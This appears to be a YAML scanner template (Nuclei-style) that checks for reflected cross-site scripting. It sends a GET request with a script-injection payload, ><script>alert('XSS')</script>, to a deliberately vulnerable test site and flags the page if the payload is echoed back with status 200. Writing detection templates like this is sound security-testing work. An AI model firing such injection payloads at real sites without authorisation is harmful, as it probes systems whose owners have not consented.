id: valid8-rxss

info:
  name: RXSS Detection
  author: Rutger Harmers
  severity: medium

requests:
  - method: GET
    path:
      - "http://testphp.vulnweb.com/listproducts.php?cat=><script>alert('XSS')</script>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "><script>alert('XSS')</script>"
      - type: status
        status:
          - 200
